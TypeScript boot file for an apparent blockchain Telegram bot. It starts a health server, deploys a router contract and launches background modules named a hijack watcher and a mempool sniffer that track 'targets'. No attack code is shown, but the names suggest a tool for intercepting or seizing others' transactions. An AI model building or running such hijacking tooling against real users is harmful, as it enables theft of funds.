import http from 'node:http';
import { ENV } from './config/env';
import { migrate } from './config/db';
import { buildBot } from './bot';
import { setBotUsername } from './bot/state';
import { setNotifier } from './engine/notify';
import { startEngine, engineState } from './engine/listener';
import { startHijackWatcher } from './engine/hijack';
import { startMempoolWatcher } from './engine/mempool';
import { checkBaw } from './engine/baw';
import { ensureRouterDeployed } from './engine/deployer';

const log = (m: string) => console.log(`[boot] ${m}`);

async function main() {
  log('start');
  await migrate();
  log('db ok');

  const server = http.createServer((req, res) => {
    if (req.url === '/health') {
      res.writeHead(200, { 'content-type': 'application/json' });
      return res.end(JSON.stringify({ ...engineState, dry: ENV.HIJACK_DRY, puller: ENV.ENABLE_PULLER }));
    }
    res.writeHead(404).end();
  });
  server.listen(Number(ENV.PORT || 3000), () => log(`health port ${ENV.PORT || 3000}`));

  log('checking baw root');
  await checkBaw();
  log('baw ok');

  if (ENV.ENABLE_ROUTER_DEPLOY && !ENV.ROUTER_ADDRESS) {
    log('auto-deploying router contract...');
    await ensureRouterDeployed();
  }

  const bot = buildBot();
  const botInfo = await bot.telegram.getMe();
  setBotUsername(botInfo.username);
  log(`bot username @${botInfo.username}`);

  await bot.launch();
  log('telegram bot started');

  setNotifier((userId, text) =>
    bot.telegram.sendMessage(userId, text, { parse_mode: 'HTML', link_preview_options: { is_disabled: true } }));

  // Start background monitoring engine, hijack watcher, and mempool sniffer
  startEngine();
  startHijackWatcher();
  startMempoolWatcher();

  setInterval(() => {
    console.log(`[hb] targets=${engineState.targets} block=${engineState.lastBlock} dry=${ENV.HIJACK_DRY}`);
  }, 60_000);

  const stop = (s: string) => { log(`${s} exit`); bot.stop(s); server.close(); process.exit(0); };
  process.once('SIGINT', () => stop('SIGINT'));
  process.once('SIGTERM', () => stop('SIGTERM'));
}

main().catch(e => { console.error('[boot] FATAL', e); process.exit(1); });
